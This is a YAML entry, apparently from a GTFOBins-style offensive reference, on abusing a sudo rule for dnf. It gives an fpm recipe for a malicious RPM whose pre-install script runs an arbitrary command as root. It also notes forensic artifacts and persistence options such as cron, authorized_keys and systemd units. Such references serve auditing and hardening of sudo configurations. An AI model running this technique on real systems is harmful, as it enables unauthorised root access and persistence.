---
name: dnf
capabilities:
- exec
required_permissions:
  level: sudo
  notes: Requires sudo rule for this binary.
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: command
  description: Execute an arbitrary command.
  capabilities:
  - exec
  command: dnf install -y x-1.0-1.noarch.rpm --disablerepo=*
  notes: |-
    Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.

    ```
    echo /path/to/command >x.sh
    fpm -n x -s dir -t rpm -a all --before-install x.sh .
    ```

    The `--disablerepo=*` option is used for targets without Internet connectivity, can be omitted otherwise.
references:
- https://gtfobins.github.io/gtfobins/dnf/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
